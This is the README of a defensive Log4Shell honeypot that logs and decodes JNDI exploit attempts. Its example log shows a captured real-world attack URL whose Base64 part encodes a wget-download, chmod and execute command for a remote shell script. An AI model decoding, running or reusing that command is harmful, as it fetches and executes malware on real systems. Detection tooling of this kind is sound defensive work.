# log4j_catcher

Log4j exploit catcher, detect Log4Shell exploits and try to get payloads.
This is a basic python server that listen on a port and logs information when a wild log4j exploit appears

The [Phorcys](https://github.com/PiRanhaLysis/Phorcys) dependency is used to decode payload automatically and then match with Yara rules.

## Installation

### Dependancies

```shell
sudo apt install protobuf-compiler
sudo apt install libcurl4-nss-dev libpython3.9-dev libnss3 libnss3-dev
```
The previous command works for python3.9 versions, you should change to the proper version you are using. However, the code is made for python3.7 or higher. 

```shell
pip install -r requirements.txt
```

## Running

For ports that don't require TLS

with python:
```shell
python3 detector.py [port]
```

with docker:
```shell
docker build -t log4j_catcher .
docker run -itp 8080:8080 --env PORT=8080 log4j_catcher
```

For services with TLS it is recommended to have another component to handle the TLS protocol.
I typically run NGINX as a reverse proxy on the port 443 to forward https traffic to the honeypot.

Example:
```shell
$ sudo python3 detector.py 80
2021-12-10 23:39:59,951 INFO:Incoming connection from ('1.2.3.4', 51512)  
2021-12-10 23:40:28,997 INFO:Incoming connection from ('1.2.3.4', 37532)   
2021-12-11 03:53:36,729 INFO:Found payload jndi from ('45.137.21.9', 55378)                        
2021-12-11 03:53:36,729 INFO:URL: 45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
```

Data is logged into current directory path.

## Troubleshooting

### Ubuntu 18.04 lts

On Ubuntu 18.04 the python3 package is version 3.6, which is incompatible with the script.


To install python in higher version, you can follow this link: https://gist.github.com/plembo/6bc141a150cff0369574ce0b0a92f5e7


Then create a virtualenv using

```shell
$ python3.9 -m venv ./env
$ . ./env/bin/activate
```

It should be possible to install everything from now on.

## Contact

If you run into other issues, you can contact me on twitter @entropyqueen_ with a description of your issue.
